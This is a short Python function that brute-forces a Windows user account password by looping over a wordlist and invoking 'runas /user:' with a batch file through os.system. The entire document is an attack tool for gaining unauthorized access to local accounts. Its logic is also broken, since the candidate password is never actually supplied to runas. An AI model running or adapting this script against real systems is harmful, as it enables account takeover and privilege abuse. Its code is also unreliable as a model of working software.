## -*- coding: utf-8 -*-
import os, sys, time 
def userbruteforce(args):
    try:
        user = args[0]
        passlist = args[1]
        print(user,passlist)
        try:
            with open(passlist) as f:
                print('loaded - ',len(f.readlines()),' passwords')
        except:
            print("passlist error")
        print("Bruteforcing...")
        
        with open(passlist) as f:
            for line in f:
                payload ="runas /user:"+ user + " test.bat "
                ans = os.system(payload)
                payload = line.replace("\n","") 
        
                if ans == 0:
                    print(line)
                    break
        
    except:
        print('module error')